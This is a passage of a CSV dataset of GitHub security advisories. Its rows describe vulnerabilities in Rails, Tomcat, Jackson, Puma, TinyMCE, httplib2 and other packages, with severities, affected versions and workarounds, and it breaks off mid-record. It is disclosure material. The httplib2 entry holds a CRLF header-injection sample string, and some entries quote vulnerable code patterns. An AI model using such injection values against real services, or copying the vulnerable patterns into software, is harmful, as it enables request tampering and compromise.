787,18865,actionpack,GHSA-h56m-vwxc-3qpw,CVE-2014-7829,https://github.com/advisories/GHSA-h56m-vwxc-3qpw,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects actionpack,"Directory traversal vulnerability in actionpack/lib/action_dispatch/middleware/static.rb in Action Pack in Ruby on Rails 3.x before 3.2.21, 4.0.x before 4.0.12, 4.1.x before 4.1.8, and 4.2.x before 4.2.0.beta4, when serve_static_assets is enabled, allows remote attackers to determine the existence of files outside the application root via vectors involving a \ (backslash) character, a similar issue to CVE-2014-7818.",rubygems
788,19061,sanitize,GHSA-p4x4-rw2p-8j8m,CVE-2020-4054,https://github.com/advisories/GHSA-p4x4-rw2p-8j8m,high,2020-06-16 22:08:06 UTC,Cross-site Scripting in Sanitize,"When HTML is sanitized using Sanitize's ""relaxed"" config or a custom config that allows certain elements, some content in a `<math>` or `<svg>` element may not be sanitized correctly even if `math` and `svg` are not in the allowlist.

You are likely to be vulnerable to this issue if you use Sanitize's relaxed config or a custom config that allows one or more of the following HTML elements:

- `iframe`
- `math`
- `noembed`
- `noframes`
- `noscript`
- `plaintext`
- `script`
- `style`
- `svg`
- `xmp`

### Impact

Using carefully crafted input, an attacker may be able to sneak arbitrary HTML through Sanitize, potentially resulting in XSS (cross-site scripting) or other undesired behavior when that HTML is rendered in a browser.

### Releases

This problem has been fixed in Sanitize 5.2.1.

### Workarounds

If upgrading is not possible, a workaround is to override the default value of Sanitize's `:remove_contents` config option with the following value, which ensures that the contents of `math` and `svg` elements (among others) are removed entirely when those elements are not in the allowlist:

```ruby
%w[iframe math noembed noframes noscript plaintext script style svg xmp]
```

For example, if you currently use Sanitize's relaxed config, you can create a custom config object that overrides the default value of `:remove_contents` like this:

```ruby
custom_config = Sanitize::Config.merge(
  Sanitize::Config::RELAXED,
  :remove_contents => %w[iframe math noembed noframes noscript plaintext script style svg xmp]
)
```

You would then pass this custom config to Sanitize when sanitizing HTML.

### For more information

If you have any questions or comments about this advisory:

- Open an issue in the [Sanitize repo](https://github.com/rgrove/sanitize).
- See Sanitize's [security policy](https://github.com/rgrove/sanitize/security/policy).

### Credits

Many thanks to Michal Bentkowski of Securitum for reporting this bug and helping to verify the fix.

### References

- [GHSA-p4x4-rw2p-8j8m](https://github.com/rgrove/sanitize/security/advisories/GHSA-p4x4-rw2p-8j8m)
- [CVE-2020-4054](https://nvd.nist.gov/vuln/detail/CVE-2020-4054)
- https://github.com/rgrove/sanitize/releases/tag/v5.2.1",rubygems
789,34320,org.apache.tomcat.embed:tomcat-embed-core,GHSA-qcxh-w3j9-58qr,CVE-2019-0199,https://github.com/advisories/GHSA-qcxh-w3j9-58qr,high,2020-06-15 18:51:09 UTC,Denial of Service in Tomcat,"The HTTP/2 implementation in Apache Tomcat 9.0.0.M1 to 9.0.14 and 8.5.0 to 8.5.37 accepted streams with excessive numbers of SETTINGS frames and also permitted clients to keep streams open without reading/writing request/response data. By keeping streams open for requests that utilised the Servlet API's blocking I/O, clients were able to cause server-side threads to block eventually leading to thread exhaustion and a DoS.",maven
790,34320,org.apache.tomcat.embed:tomcat-embed-core,GHSA-c9hw-wf7x-jp9j,CVE-2020-1938,https://github.com/advisories/GHSA-c9hw-wf7x-jp9j,critical,2020-06-15 18:51:21 UTC,Improper Privilege Management in Tomcat,"When using the Apache JServ Protocol (AJP), care must be taken when trusting incoming connections to Apache Tomcat. Tomcat treats AJP connections as having higher trust than, for example, a similar HTTP connection. If such connections are available to an attacker, they can be exploited in ways that may be surprising. In Apache Tomcat 9.0.0.M1 to 9.0.0.30, 8.5.0 to 8.5.50 and 7.0.0 to 7.0.99, Tomcat shipped with an AJP Connector enabled by default that listened on all configured IP addresses. It was expected (and recommended in the security guide) that this Connector would be disabled if not required. This vulnerability report identified a mechanism that allowed: returning arbitrary files from anywhere in the web application, processing any file in the web application as a JSP Further, if the web application allowed file upload and stored those files within the web application (or the attacker was able to control the content of the web application by some other means) then this, along with the ability to process a file as a JSP, made remote code execution possible. It is important to note that mitigation is only required if an AJP port is accessible to untrusted users. Users wishing to take a defence-in-depth approach and block the vector that permits returning arbitrary files and execution as JSP may upgrade to Apache Tomcat 9.0.31, 8.5.51 or 7.0.100 or later. A number of changes were made to the default AJP Connector configuration in 9.0.31 to harden the default configuration. It is likely that users upgrading to 9.0.31, 8.5.51 or 7.0.100 or later will need to make small changes to their configurations.",maven
791,33974,xerces:xercesImpl,GHSA-334p-wv2m-w3vp,CVE-2009-2625,https://github.com/advisories/GHSA-334p-wv2m-w3vp,moderate,2020-06-15 18:51:30 UTC,Denial of service in Apache Xerces2,"XMLScanner.java in Apache Xerces2 Java, as used in Sun Java Runtime Environment (JRE) in JDK and JRE 6 before Update 15 and JDK and JRE 5.0 before Update 20, and in other products, allows remote attackers to cause a denial of service (infinite loop and application hang) via malformed XML input, as demonstrated by the Codenomicon XML fuzzing framework.",maven
792,33974,xerces:xercesImpl,GHSA-vmqm-g3vh-847m,CVE-2012-0881,https://github.com/advisories/GHSA-vmqm-g3vh-847m,high,2020-06-15 18:51:38 UTC,Denial of service in Apache Xerces2,"Apache Xerces2 Java Parser before 2.12.0 allows remote attackers to cause a denial of service (CPU consumption) via a crafted message to an XML service, which triggers hash table collisions.",maven
793,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-f3j5-rmmp-3fc5,CVE-2019-17267,https://github.com/advisories/GHSA-f3j5-rmmp-3fc5,critical,2020-06-15 18:44:48 UTC,Improper Input Validation in jackson-databind,A Polymorphic Typing issue was discovered in FasterXML jackson-databind before 2.9.10. It is related to net.sf.ehcache.hibernate.EhcacheJtaTransactionManagerLookup.,maven
794,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-6wqp-v4v6-c87c,CVE-2018-12023,https://github.com/advisories/GHSA-6wqp-v4v6-c87c,high,2020-06-15 18:44:51 UTC,Deserialization of Untrusted Data,"An issue was discovered in FasterXML jackson-databind prior to 2.7.9.4, 2.8.11.2, and 2.9.6. When Default Typing is enabled (either globally or for a specific property), the service has the Oracle JDBC jar in the classpath, and an attacker can provide an LDAP service to access, it is possible to make the service execute a malicious payload.",maven
795,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-wrr7-33fx-rcvj,,https://github.com/advisories/GHSA-wrr7-33fx-rcvj,high,2020-06-15 18:44:56 UTC,Deserialization of Untrusted Data in jackson-databind,**Withdrawn:** Duplicate of GHSA-cjjf-94ff-43w7,maven
796,34025,org.springframework.security:spring-security-core,GHSA-2ppp-9496-p23q,CVE-2020-5408,https://github.com/advisories/GHSA-2ppp-9496-p23q,moderate,2020-06-15 19:34:31 UTC,Insufficient Entropy in Spring Security,"Spring Security versions 5.3.x prior to 5.3.2, 5.2.x prior to 5.2.4, 5.1.x prior to 5.1.10, 5.0.x prior to 5.0.16 and 4.2.x prior to 4.2.16 use a fixed null initialization vector with CBC Mode in the implementation of the queryable text encryptor. A malicious user with access to the data that has been encrypted using such an encryptor may be able to derive the unencrypted values using a dictionary attack.",maven
797,34137,io.netty:netty-handler,GHSA-mm9x-g8pc-w292,CVE-2020-11612,https://github.com/advisories/GHSA-mm9x-g8pc-w292,high,2020-06-15 19:36:16 UTC,Denial of Service in Netty,"The ZlibDecoders in Netty 4.1.x before 4.1.46 allow for unbounded memory allocation while decoding a ZlibEncoded byte stream. An attacker could send a large ZlibEncoded byte stream to the Netty server, forcing the server to allocate all of its free memory to a single decoder.",maven
798,33975,org.apache.commons:commons-collections4,GHSA-6hgm-866r-3cjv,CVE-2015-6420,https://github.com/advisories/GHSA-6hgm-866r-3cjv,high,2020-06-15 20:36:20 UTC,Insecure Deserialization in Apache Commons Collection,Serialized-object interfaces in Java applications using the Apache Commons Collections (ACC) library may allow remote attackers to execute arbitrary commands via a crafted serialized Java object.,maven
799,33915,commons-beanutils:commons-beanutils,GHSA-6phf-73q6-gh87,CVE-2019-10086,https://github.com/advisories/GHSA-6phf-73q6-gh87,high,2020-06-15 20:36:17 UTC,Insecure Deserialization in Apache Commons Beanutils,"In Apache Commons Beanutils 1.9.2, a special BeanIntrospector class was added which allows suppressing the ability for an attacker to access the classloader via the class property available on all Java objects. We, however were not using this by default characteristic of the PropertyUtilsBean.",maven
800,33915,commons-beanutils:commons-beanutils,GHSA-p66x-2cv9-qq3v,CVE-2014-0114,https://github.com/advisories/GHSA-p66x-2cv9-qq3v,high,2020-06-10 23:38:01 UTC,Arbitrary code execution in Apache Commons BeanUtils,"Apache Commons BeanUtils, as distributed in lib/commons-beanutils-1.8.0.jar in Apache Struts 1.x through 1.3.10 and in other products requiring commons-beanutils through 1.9.2, does not suppress the class property, which allows remote attackers to ""manipulate"" the ClassLoader and execute arbitrary code via the class parameter, as demonstrated by the passing of this parameter to the getClass method of the ActionForm object in Struts 1.",maven
801,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-58pp-9c76-5625,CVE-2020-11112,https://github.com/advisories/GHSA-58pp-9c76-5625,high,2020-06-10 21:12:41 UTC,jackson-databind mishandles the interaction between serialization gadgets and typing,"FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.apache.commons.proxy.provider.remoting.RmiProvider (aka apache/commons-proxy).",maven
802,19180,geocoder,GHSA-864j-6qpp-cmrr,CVE-2020-7981,https://github.com/advisories/GHSA-864j-6qpp-cmrr,critical,2020-06-10 20:03:02 UTC,SQL Injection in Geocoder,"sql.rb in Geocoder before 1.6.1 allows Boolean-based SQL injection when within_bounding_box is used in conjunction with untrusted sw_lat, sw_lng, ne_lat, or ne_lng data.",rubygems
803,18230,apollo-server,GHSA-w42g-7vfc-xf37,,https://github.com/advisories/GHSA-w42g-7vfc-xf37,moderate,2020-06-05 19:38:14 UTC,Introspection in schema validation in Apollo Server,"We encourage all users of Apollo Server to read this advisory in its entirety to understand the impact.  The _Resolution_ section contains details on patched versions.

### Impact

If `subscriptions: false` is passed to the `ApolloServer` constructor options, there is no impact.  If implementors were not expecting validation rules to be enforced on the WebSocket subscriptions transport **and** are unconcerned about introspection being enabled on the WebSocket subscriptions transport (or were not expecting that), then this advisory is not applicable.  If `introspection: true` is passed to the `ApolloServer` constructor options, the impact is limited to user-provided validation rules (i.e., using `validationRules`) since there would be no expectation that introspection was disabled.

The enforcement of user-provided validation rules on the HTTP transport is working as intended and is unaffected by this advisory.  Similarly, disabling introspection on the HTTP transport is working as intended and is unaffected by this advisory.

> **Note:** Unless `subscriptions: false` is explicitly passed to the constructor parameters of `new ApolloServer({ ... })`, **subscriptions are enabled by default, whether or not there is a `Subscription` type present in the schema.**  As an alternative to upgrading to a patched version, see the _Workarounds_ section below to disable subscriptions if it is not necessary.

In cases where `subscriptions: false` is **not** explicitly set, the subscription server **is impacted** since validation rules which are enforced on the main request pipeline within Apollo Server were not being passed to the `SubscriptionServer.create` invocation ([seen here, prior to the patch](https://github.com/apollographql/apollo-server/blob/7d6f23443e52a90deb74f152f34bb76eea78ee19/packages/apollo-server-core/src/ApolloServer.ts#L677-L726)). 

The omitted validation rules for the subscription server include any `validationRules` passed by implementors to the `ApolloServer` constructor which were expected to be enforced on the subscriptions WebSocket endpoint.  **Additionally**, because an internal [`NoIntrospection`](https://github.com/apollographql/apollo-server/blob/7d6f23443/packages/apollo-server-core/src/ApolloServer.ts#L77-L88) validation rule is used to disable introspection, it would have been possible to introspect a server on the WebSocket endpoint that the `SubscriptionServer` creates even though it was not possible on other transports (e.g. HTTP).

**The severity of risk depends on whether sensitive information is being stored in the schema itself.**  The contents of schema descriptions, or secrets which might be revealed by the names of types or field names within those types, will determine the risk to individual implementors.

### Affected packages

The bug existed in `apollo-server-core` versions prior to version 2.14.2, however, this means all integration packages (e.g., `apollo-server-express`, etc.) prior to version 2.14.2 which depend on `apollo-server-core` for their subscriptions support are affected.  This includes the `apollo-server` package that automatically provides an Express server.

Therefore, for officially published Apollo Server packages, the full list of affected packages includes: `apollo-server`, `apollo-server-azure-functions`, `apollo-server-cache-memcached`, `apollo-server-core`, `apollo-server-cloud-functions`, `apollo-server-cloudflare`, `apollo-server-express`, `apollo-server-fastify`, `apollo-server-hapi`, `apollo-server-koa`, `apollo-server-lambda`, and `apollo-server-micro`.

> Note: The full list included here doesn't fit into the box provided by the GitHub Security Advisories form.

### Resolution

The problem is resolved in Apollo Server versions 2.14.2 or higher.  If upgrading is not an option, see _Workarounds_ below.  When upgrading, ensure that the affected integration package (e.g., `apollo-server-express`) **and** the `apollo-server-core` package are both updated to the patched versions.  (The version numbers should both be  2.14.2.)

### Workarounds

Upgrading to a patched version is the recommended solution.  If upgrading is not an option, subscriptions can be disabled with `subscriptions: false` to resolve the impact.  **Disabling subscriptions in this way will disable _all_ subscriptions support and the WebSocket transport**:

```js
const server = new ApolloServer({
  subscriptions: false,
  /* Other options, such as typeDefs, resolvers, schema, etc. */
});
```

### For more information
If you have any questions or comments about this advisory, please [open an issue](https://github.com/apollographql/apollo-server/issues/new) and the maintainers will try to assist.

### Credit and appreciation

Apollo fully believes in ethical disclosure of vulnerabilities by security researchers who notify us with details and provide us time to address and fix the issues before publicly disclosing.

Credit for this discovery goes to the team at [Bitwala](https://www.bitwala.com/), who reported the concern to us responsibly after discovering it during their own auditing.",npm
804,34025,org.springframework.security:spring-security-core,GHSA-48rw-j489-928m,CVE-2020-5407,https://github.com/advisories/GHSA-48rw-j489-928m,high,2020-06-05 16:13:29 UTC,Signature wrapping vulnerability in Spring Security,"Spring Security versions 5.2.x prior to 5.2.4 and 5.3.x prior to 5.3.2 contain a signature wrapping vulnerability during SAML response validation. When using the spring-security-saml2-service-provider component, a malicious user can carefully modify an otherwise valid SAML response and append an arbitrary assertion that Spring Security will accept as valid.",maven
805,35475,org.springframework.cloud:spring-cloud-config-server,GHSA-32xf-jwmv-9hf3,CVE-2020-5410,https://github.com/advisories/GHSA-32xf-jwmv-9hf3,high,2020-06-05 16:13:20 UTC,Directory traversal attack in Spring Cloud Config,"Spring Cloud Config, versions 2.2.x prior to 2.2.3, versions 2.1.x prior to 2.1.9, and older unsupported versions allow applications to serve arbitrary configuration files through the spring-cloud-config-server module. A malicious user, or attacker, can send a request using a specially crafted URL that can lead to a directory traversal attack.",maven
806,35475,org.springframework.cloud:spring-cloud-config-server,GHSA-g86w-v5vg-9gxf,CVE-2020-5405,https://github.com/advisories/GHSA-g86w-v5vg-9gxf,moderate,2020-06-05 16:11:36 UTC,Directory traversal attack in Spring Cloud Config,"Spring Cloud Config, versions 2.2.x prior to 2.2.2, versions 2.1.x prior to 2.1.7, and older unsupported versions allow applications to serve arbitrary configuration files through the spring-cloud-config-server module. A malicious user, or attacker, can send a request using a specially crafted URL that can lead a directory traversal attack.",maven
807,34993,org.apache.ignite:ignite-core,GHSA-5wm5-8q42-rhxg,CVE-2020-1963,https://github.com/advisories/GHSA-5wm5-8q42-rhxg,critical,2020-06-05 16:11:02 UTC,File system access via H2 in Apache Ignite,Apache Ignite uses H2 database to build SQL distributed execution engine. H2 provides SQL functions which could be used by attacker to access to a filesystem.,maven
808,18941,kaminari,GHSA-r5jw-62xg-j433,CVE-2020-11082,https://github.com/advisories/GHSA-r5jw-62xg-j433,moderate,2020-05-28 21:10:11 UTC,Cross-Site Scripting in Kaminari,"### Impact
In Kaminari before 1.2.1, there is a vulnerability that would allow an attacker to inject arbitrary code into pages with pagination links. This has been fixed in 1.2.1.

### Releases
The 1.2.1 gem including the patch has already been released.
All past released versions are affected by this vulnerability.

### Workarounds
Application developers who can't update the gem can workaround by overriding the `PARAM_KEY_EXCEPT_LIST` constant.

```ruby
module Kaminari::Helpers
  PARAM_KEY_EXCEPT_LIST = [:authenticity_token, :commit, :utf8, :_method, :script_name, :original_script_name].freeze
end
```

### Credits
Thanks to Daniel Mircea for finding the issue and sending a patch via GitHub. Also thanks to Aditya Prakash for reporting the vulnerability.",rubygems
809,18253,aegir,GHSA-qfcv-5whw-7pcw,CVE-2020-11059,https://github.com/advisories/GHSA-qfcv-5whw-7pcw,critical,2020-05-27 21:09:15 UTC,Exposure of Sensitive Information to an Unauthorized Actor in AEgir,"### Impact
`aegir publish` and `aegir build` may leak secrets from environmental variables in the browser bundle published to npm.

### Patches
The code has been patched, users should upgrade to >= 21.10.1

### Workarounds
Run `printenv` to check your environment variables and revoke any secrets.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [aegir](https://github.com/ipfs/aegir)",npm
810,18865,actionpack,GHSA-jp5v-5gx4-jmj9,CVE-2020-8166,https://github.com/advisories/GHSA-jp5v-5gx4-jmj9,moderate,2020-05-26 15:11:13 UTC,Ability to forge per-form CSRF tokens in Rails,"It is possible to possible to, given a global CSRF token such as the one
present in the authenticity_token meta tag, forge a per-form CSRF token for
any action for that session.

Impact
------

Given the ability to extract the global CSRF token, an attacker would be able to
construct a per-form CSRF token for that session.

Workarounds
-----------

This is a low-severity security issue. As such, no workaround is necessarily
until such time as the application can be upgraded.",rubygems
811,18865,actionpack,GHSA-8727-m6gj-mc37,CVE-2020-8164,https://github.com/advisories/GHSA-8727-m6gj-mc37,high,2020-05-26 15:09:16 UTC,Possible Strong Parameters Bypass in ActionPack,"There is a strong parameters bypass vector in ActionPack.

Versions Affected:  rails <= 6.0.3
Not affected:       rails < 4.0.0
Fixed Versions:     rails >= 5.2.4.3, rails >= 6.0.3.1

Impact
------
In some cases user supplied information can be inadvertently leaked from
Strong Parameters.  Specifically the return value of `each`, or `each_value`,
or `each_pair` will return the underlying ""untrusted"" hash of data that was
read from the parameters.  Applications that use this return value may be
inadvertently use untrusted user input.

Impacted code will look something like this:

```
def update
  # Attacker has included the parameter: `{ is_admin: true }`
  User.update(clean_up_params)
end

def clean_up_params
   params.each { |k, v|  SomeModel.check(v) if k == :name }
end
```

Note the mistaken use of `each` in the `clean_up_params` method in the above
example.

Workarounds
-----------
Do not use the return values of `each`, `each_value`, or `each_pair` in your
application.",rubygems
812,27640,activestorage,GHSA-m42x-37p3-fv5w,CVE-2020-8162,https://github.com/advisories/GHSA-m42x-37p3-fv5w,high,2020-05-26 15:09:48 UTC,Circumvention of file size limits in ActiveStorage,"There is a vulnerability in ActiveStorage's S3 adapter that allows the Content-Length of a
direct file upload to be modified by an end user.

Versions Affected:  rails < 5.2.4.2, rails < 6.0.3.1
Not affected:       Applications that do not use the direct upload functionality of the ActiveStorage S3 adapter.
Fixed Versions:     rails >= 5.2.4.3, rails >= 6.0.3.1

Impact
------

Utilizing this vulnerability, an attacker can control the Content-Length of an S3 direct upload URL without receiving a
new signature from the server. This could be used to bypass controls in place on the server to limit upload size.

Workarounds
-----------

This is a low-severity security issue. As such, no workaround is necessarily
until such time as the application can be upgraded.",rubygems
813,18817,activesupport,GHSA-2p68-f74v-9wc6,CVE-2020-8165,https://github.com/advisories/GHSA-2p68-f74v-9wc6,critical,2020-05-26 14:49:24 UTC,Unintended unmarshalling in ActiveSupport,"In ActiveSupport, there is potentially unexpected behaviour in the MemCacheStore and RedisCacheStore where, when
untrusted user input is written to the cache store using the `raw: true` parameter, re-reading the result
from the cache can evaluate the user input as a Marshalled object instead of plain text. Vulnerable code looks like:

```
data = cache.fetch(""demo"", raw: true) { untrusted_string }
```
Versions Affected:  rails < 5.2.5, rails < 6.0.4
Not affected:       Applications not using MemCacheStore or RedisCacheStore. Applications that do not use the `raw` option when storing untrusted user input.
Fixed Versions:     rails >= 5.2.4.3, rails >= 6.0.3.1
  
Impact
------
Unmarshalling of untrusted user input can have impact up to and including RCE. At a minimum,
this vulnerability allows an attacker to inject untrusted Ruby objects into a web application.
In addition to upgrading to the latest versions of Rails, developers should ensure that whenever
they are calling `Rails.cache.fetch` they are using consistent values of the `raw` parameter for both
reading and writing, especially in the case of the RedisCacheStore which does not, prior to these changes,
detect if data was serialized using the raw option upon deserialization.

Workarounds
-----------
It is recommended that application developers apply the suggested patch or upgrade to the latest release as
soon as possible. If this is not possible, we recommend ensuring that all user-provided strings cached using
the `raw` argument should be double-checked to ensure that they conform to the expected format.",rubygems
814,18987,puma,GHSA-w64w-qqph-5gxm,CVE-2020-11077,https://github.com/advisories/GHSA-w64w-qqph-5gxm,moderate,2020-05-22 14:55:09 UTC,HTTP Smuggling via Transfer-Encoding Header in Puma,"### Impact
This is a similar but different vulnerability to the one patched in 3.12.5 and 4.3.4.

A client could smuggle a request through a proxy, causing the proxy to send a response back to another unknown client. 

If the proxy uses persistent connections and the client adds another request in via HTTP pipelining, the proxy may mistake it as the first request's body. Puma, however, would see it as two requests, and when processing the second request, send back a response that the proxy does not expect. If the proxy has reused the persistent connection to Puma to send another request for a different client, the second response from the first client will be sent to the second client.

### Patches

The problem has been fixed in Puma 3.12.6 and Puma 4.3.5.

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [Puma](https://github.com/puma/puma)
* See our [security policy](https://github.com/puma/puma/security/policy)",rubygems
815,18987,puma,GHSA-x7jg-6pwg-fx5h,CVE-2020-11076,https://github.com/advisories/GHSA-x7jg-6pwg-fx5h,high,2020-05-22 14:55:05 UTC,HTTP Smuggling via Transfer-Encoding Header in Puma,"### Impact

By using an invalid transfer-encoding header, an attacker could [smuggle an HTTP response.](https://portswigger.net/web-security/request-smuggling)

Originally reported by @ZeddYu, who has our thanks for the detailed report.

### Patches

The problem has been fixed in Puma 3.12.5 and Puma 4.3.4.

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [Puma](https://github.com/puma/puma)
* See our [security policy](https://github.com/puma/puma/security/policy)",rubygems
816,18993,activeresource,GHSA-46j2-xjgp-jrfm,CVE-2020-8151,https://github.com/advisories/GHSA-46j2-xjgp-jrfm,high,2020-05-21 21:09:38 UTC,Information disclosure issue in Active Resource,There is a possible information disclosure issue in Active Resource <v5.1.1 that could allow an attacker to create specially crafted requests to access data in an unexpected way and possibly leak information.,rubygems
817,34413,net.sourceforge.htmlunit:htmlunit,GHSA-5mh9-r3rr-9597,CVE-2020-5529,https://github.com/advisories/GHSA-5mh9-r3rr-9597,high,2020-05-21 21:08:33 UTC,Code execution vulnerability in HtmlUnit,"HtmlUnit prior to 2.37.0 contains code execution vulnerabilities. HtmlUnit initializes Rhino engine improperly, hence a malicious JavScript code can execute arbitrary Java code on the application. Moreover, when embedded in Android application, Android-specific initialization of Rhino engine is done in an improper way, hence a malicious JavaScript code can execute arbitrary Java code on the application.",maven
818,34320,org.apache.tomcat.embed:tomcat-embed-core,GHSA-344f-f5vg-2jfj,CVE-2020-9484,https://github.com/advisories/GHSA-344f-f5vg-2jfj,high,2020-05-21 18:52:29 UTC,Potential remote code execution in Apache Tomcat,"When using Apache Tomcat versions 10.0.0-M1 to 10.0.0-M4, 9.0.0.M1 to 9.0.34, 8.5.0 to 8.5.54 and 7.0.0 to 7.0.103 if a) an attacker is able to control the contents and name of a file on the server; and b) the server is configured to use the PersistenceManager with a FileStore; and c) the PersistenceManager is configured with sessionAttributeValueClassNameFilter=""null"" (the default unless a SecurityManager is used) or a sufficiently lax filter to allow the attacker provided object to be deserialized; and d) the attacker knows the relative file path from the storage location used by FileStore to the file the attacker has control over; then, using a specifically crafted request, the attacker will be able to trigger remote code execution via deserialization of the file under their control. Note that all of conditions a) to d) must be true for the attack to succeed.",maven
819,34700,org.apache.commons:commons-configuration2,GHSA-7qx4-pp76-vrqh,CVE-2020-1953,https://github.com/advisories/GHSA-7qx4-pp76-vrqh,critical,2020-05-21 19:08:08 UTC,Remote code execution in Apache Commons Configuration,"Apache Commons Configuration uses a third-party library to parse YAML files which by default allows the instantiation of classes if the YAML includes special statements. Apache Commons Configuration versions 2.2, 2.3, 2.4, 2.5, 2.6 did not change the default settings of this library. So if a YAML file was loaded from an untrusted source, it could therefore load and execute code out of the control of the host application.",maven
820,15892,jquery,GHSA-q4m3-2j7h-f7xw,CVE-2020-7656,https://github.com/advisories/GHSA-q4m3-2j7h-f7xw,moderate,2020-05-20 16:18:01 UTC,Cross-Site Scripting in jquery,"Versions of `jquery` prior to 1.9.0 are vulnerable to Cross-Site Scripting. The load method fails to recognize and remove ""<script>"" HTML tags that contain a whitespace character, i.e: ""</script >"", which results in the enclosed script logic to be executed. This allows attackers to execute arbitrary JavaScript in a victim's browser.


## Recommendation

Upgrade to version 1.9.0 or later.",npm
821,19914,httplib2,GHSA-gg84-qgv9-w4pq,CVE-2020-11078,https://github.com/advisories/GHSA-gg84-qgv9-w4pq,low,2020-05-20 15:55:47 UTC,CRLF injection in httplib2,"### Impact
Attacker controlling unescaped part of uri for `httplib2.Http.request()` could change request headers and body, send additional hidden requests to same server.

Impacts software that uses httplib2 with uri constructed by string concatenation, as opposed to proper urllib building with escaping.

### Patches
Problem has been fixed in 0.18.0
Space, CR, LF characters are now quoted before any use.
This solution should not impact any valid usage of httplib2 library, that is uri constructed by urllib.

### Workarounds
Create URI with `urllib.parse` family functions: `urlencode`, `urlunsplit`.

```diff
user_input = "" HTTP/1.1\r\ninjected: attack\r\nignore-http:""
-uri = ""https://api.server/?q={}"".format(user_input)
+uri = urllib.parse.urlunsplit((""https"", ""api.server"", ""/v1"", urllib.parse.urlencode({""q"": user_input}), """"))
http.request(uri)
```

### References
https://cwe.mitre.org/data/definitions/93.html
https://docs.python.org/3/library/urllib.parse.html

Thanks to Recar https://github.com/Ciyfly for finding vulnerability and discrete notification.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [httplib2](https://github.com/httplib2/httplib2/issues/new)
* Email [current maintainer at 2020-05](mailto:temotor@gmail.com)",pip
822,19844,Pillow,GHSA-r854-96gq-rfg3,CVE-2014-1933,https://github.com/advisories/GHSA-r854-96gq-rfg3,moderate,2020-05-18 17:41:19 UTC,Python Image Library (PIL) allows symlink attacks,"The (1) JpegImagePlugin.py and (2) EpsImagePlugin.py scripts in Python Image Library (PIL) 1.1.7 and earlier and Pillow before 2.3.1 uses the names of temporary files on the command line, which makes it easier for local users to conduct symlink attacks by listing the processes.",pip
823,27416,actionpack-page_caching,GHSA-mg5p-95m9-rmfp,CVE-2020-8159,https://github.com/advisories/GHSA-mg5p-95m9-rmfp,critical,2020-05-13 16:28:46 UTC,Arbitrary file write in actionpack-page_caching gem,"There is a vulnerability in actionpack_page-caching gem < v1.2.1 that allows an attacker to write arbitrary files to a web server, potentially resulting in remote code execution if the attacker can write unescaped ERB to a view.",rubygems
824,20741,tensorflow,GHSA-h98h-8mxr-m8gx,CVE-2018-21233,https://github.com/advisories/GHSA-h98h-8mxr-m8gx,moderate,2020-05-13 16:01:35 UTC,Out-of-bounds read in TensorFlow possibly causing disclosure of the contents of process memory.,"TensorFlow before 1.7.0 has an integer overflow that causes an out-of-bounds read, possibly causing disclosure of the contents of process memory. This occurs in the DecodeBmp feature of the BMP decoder in core/kernels/decode_bmp_op.cc.",pip
825,20741,tensorflow,GHSA-jfq2-rj7f-9gvf,CVE-2018-7576,https://github.com/advisories/GHSA-jfq2-rj7f-9gvf,moderate,2019-04-24 16:11:27 UTC,Null pointer dereference in TensorFlow leads to exploitation,Google TensorFlow 1.6.x and earlier is affected by: Null Pointer Dereference. The type of exploitation is: context-dependent.,pip
826,18135,tinymce,GHSA-c78w-2gw7-gjv3,CVE-2019-1010091,https://github.com/advisories/GHSA-c78w-2gw7-gjv3,moderate,2020-05-11 20:00:15 UTC,XSS in TinyMCE,"### Impact
A cross-site scripting (XSS) vulnerability was discovered in: the core parser and `media` plugin. The vulnerability allowed arbitrary JavaScript execution when inserting a specially crafted piece of content into the editor via the clipboard or APIs. This impacts all users who are using TinyMCE 4.9.9 or lower and TinyMCE 5.2.1 or lower.

### Patches
This vulnerability has been patched in TinyMCE 4.9.10 and 5.2.2 by improved HTML parsing and sanitization logic.

### Workarounds
The workarounds available are:
- disable the media plugin and manually sanitize CDATA content (see below)
or
- upgrade to either TinyMCE 4.9.10 or TinyMCE 5.2.2

#### Example: Manually strip CDATA elements
```js
setup: function(editor) {
  editor.on('PreInit', function() {
    editor.parser.addNodeFilter('#cdata', function(nodes) {
      for (var i = 0; i < nodes.length; i++) {
        nodes[i].remove();
      }
    });
  });
}
```

### Acknowledgements
Tiny Technologies would like to thank Michał Bentkowski and [intivesec](https://github.com/intivesec) for discovering these vulnerabilities.

### References
https://www.tiny.cloud/docs/release-notes/release-notes522/#securityfixes

### For more information
If you have any questions or comments about this advisory:
* Open an issue in the [TinyMCE repo](https://github.com/tinymce/tinymce/issues)
* Email us at [infosec@tiny.cloud](mailto:infosec@tiny.cloud)",npm
827,34681,org.java-websocket:Java-WebSocket,GHSA-gw55-jm4h-x339,CVE-2020-11050,https://github.com/advisories/GHSA-gw55-jm4h-x339,high,2020-05-08 18:54:39 UTC,Improper Validation of Certificate with Host Mismatch in Java-WebSocket,"The Java-WebSocket Client does not perform hostname verification.

 - This means that SSL certificates of other hosts are accepted as long as they are trusted. To exploit this vulnerability an attacker has to perform a man-in-the-middle (MITM) attack between a Java application using the Java-WebSocket Client and an WebSocket server it's connecting to.
 - TLS normally protects users and systems against MITM attacks, it cannot if certificates from other trusted hosts are accepted by the client.

For more information see: CWE-297: Improper Validation of Certificate with Host Mismatch - https://cwe.mitre.org/data/definitions/297.html

## Important note

The OWASP Dependency-Check (https://jeremylong.github.io/DependencyCheck/index.html) may report that a dependency of your project is affected by this security vulnerability, but you don't use this lib.
This is caused by the fuzzy search in the OWASP implementation.
Check out this issue (https://github.com/TooTallNate/Java-WebSocket/issues/1019#issuecomment-628507934) for more information and a way to suppress the warning.",maven
828,27336,sorcery,GHSA-jc8m-cxhj-668x,CVE-2020-11052,https://github.com/advisories/GHSA-jc8m-cxhj-668x,high,2020-05-07 21:16:46 UTC,Improper Restriction of Excessive Authentication Attempts in Sorcery,"### Impact
